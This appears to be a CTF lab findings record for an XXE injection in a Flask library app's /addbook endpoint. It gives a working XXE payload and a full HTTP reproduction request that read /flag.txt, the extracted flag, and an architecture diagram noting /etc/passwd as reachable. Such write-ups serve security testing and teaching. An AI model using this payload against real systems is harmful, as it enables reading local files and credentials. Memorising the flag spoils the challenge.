findings.title: XXE Injection in /addbook XML Parser - CTF Flag Extracted
findings.description: The /addbook endpoint parses XML input without disabling external entity processing. An attacker can inject an XXE payload to read arbitrary local files. The CTF flag was extracted from /flag.txt via XXE injection through the xml POST parameter.
findings.evidence:
XXE payload sent to POST /addbook (xml= parameter):

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<Book><Title>&xxe;</Title><ISBN>123</ISBN><Editor>J</Editor><Publisher>P</Publisher><Chapters/></Book>

Response body contained:
<Book><Title>flag{71ecc5af-ad20-40ec-8733-50b0a19f705c}
</Title><ISBN>123</ISBN>...</Book>

FLAG: flag{71ecc5af-ad20-40ec-8733-50b0a19f705c}

reproduction.command:
POST /addbook HTTP/1.1
Host: 172.17.0.1:37911
Content-Type: application/x-www-form-urlencoded

xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><Book><Title>&xxe;</Title><ISBN>123</ISBN><Editor>J</Editor><Publisher>P</Publisher><Chapters/></Book>

diagrams.title: Library V1 Application Architecture
diagrams.mermaid:
flowchart TD
  Browser["Browser / Attacker"] --> Port37911["HTTP :37911 (Flask/Werkzeug 3.1.8)"]
  Port37911 --> HomeRoute["/  - Home page with XML example"]
  Port37911 --> AddBookRoute["/addbook - POST XML input"]
  AddBookRoute --> XMLParser["XML Parser (no entity restriction)"]
  XMLParser --> FileSystem["Local Filesystem"]
  FileSystem --> FlagFile["/flag.txt - flag{71ecc5af-...}"]
  FileSystem --> EtcPasswd["/etc/passwd"]
  XMLParser --> ResultPage["Result page - reflects parsed XML content"]
